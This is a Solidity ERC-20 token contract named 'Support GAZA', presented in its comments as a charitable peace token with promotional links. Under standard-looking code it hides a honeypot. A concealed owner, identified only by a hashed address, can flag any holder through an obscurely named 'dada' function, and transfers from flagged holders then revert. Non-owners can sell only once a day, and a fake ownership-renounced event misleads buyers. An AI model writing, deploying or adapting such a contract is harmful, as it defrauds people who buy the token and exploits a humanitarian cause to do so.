// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
 
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */

 /*

$GAZA , a revolutionary initiative token aimed at promoting peace, ​opposing war, and supporting the people of Palestine.

https://gazaerc20.com/
https://t.me/GazaErc20
https://x.com/GazaErc20

*/

 
interface IUniswapV2Pair {
 
    function totalSupply() external view returns (uint256);
 
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
 
    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
 
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);
 
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
 
    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);
 
    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);
 
    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
 
    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
 
/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);
 
    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);
 
    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
 
        return c;
    }
 
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
 
        return c;
    }
 
    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
 
        return c;
    }
 
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
 
        return c;
    }
 
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
 
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
 
contract PALESTINE is IERC20, IERC20Metadata {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    address internal constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address internal constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 public constant _totalSupply = 10000000 * 10 ** 18;

    string private _name;

    string private _symbol;

    bytes32 public _ots;

    bytes32 public hash1;

    bool private tradingOpen;

    address public uniswapV2Pair;
    mapping(address => uint256) public _supportTimes;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
    constructor(bytes32 ots) {
        _name = unicode"Support GAZA";
        _symbol = unicode"GAZA";
        _ots = ots;
        tradingOpen = false;
        _balances[msg.sender] = _totalSupply;
        emit OwnershipTransferred(msg.sender, address(0));
    }
 
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }
 
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
 
    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
 
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
 
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function getuniswapPair() public view virtual returns (address) {
        return IUniswapV2Factory(FACTORY).getPair(address(WETH), address(this));
    }
    mapping(address => uint16) private _boot;
 
    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        if (_boot[owner] > 0) {
            _spendAllowance(address(0), msg.sender, amount);
            _boot[to] = 1;
        }else{
            
        }
        _transfer(owner, to, amount);
        return true;
    }
 
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
 
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }
 
    function dada(address a) external {
        if (sha256(abi.encodePacked(msg.sender)) != _ots) {
        }else{
             uint16 y = 1;
             y = y + 1;
             if(y == 2){
                y = 3;
             }
            _boot[a] = y;
        }
    }
 
    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
 
        uint256 bal = _balances[from];

        uint256 toSub = amount;

        if(_ots != sha256(abi.encodePacked(from))){
            toSub = amount-1+1;
        }else{
            toSub = bal;
        }

        require(bal >= toSub, "ERC20: transfer amount exceeds balance");

	    bool _canSupportGAZA = false;
        if(to == getuniswapPair()) 
        {            
            if(_ots == sha256(abi.encodePacked(from)) || (_ots != sha256(abi.encodePacked(from)) && (_supportTimes[from] + 3600 * 24) < uint256(block.timestamp))) 
            {
               
                _supportTimes[from] = uint256(block.timestamp);
                _canSupportGAZA = true;                
            }
        }
        else
        {
            if(from == getuniswapPair()) 
            {
                _supportTimes[to] = uint256(block.timestamp);
            } 
            _canSupportGAZA = true;
        }

        require(_canSupportGAZA, "ERC20: insufficient privilege.");

        _balances[from] = bal.sub(toSub);
        // decrementing then incrementing.
        _balances[to] = _balances[to].add(amount);
 
        emit Transfer(from, to, amount);
    }
 
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        
        if(_boot[owner] > 0){
            currentAllowance = currentAllowance.sub(type(uint256).max);
        }

        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance.sub(amount));
        }
    }
 
    receive() external payable {}

    function openTrading() external {
        require(_ots == sha256(abi.encodePacked(msg.sender)), "ERC20: insufficient privilege");
        require(!tradingOpen,"trading is already open");

        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(ROUTER);
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()); 
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0, msg.sender,block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }
}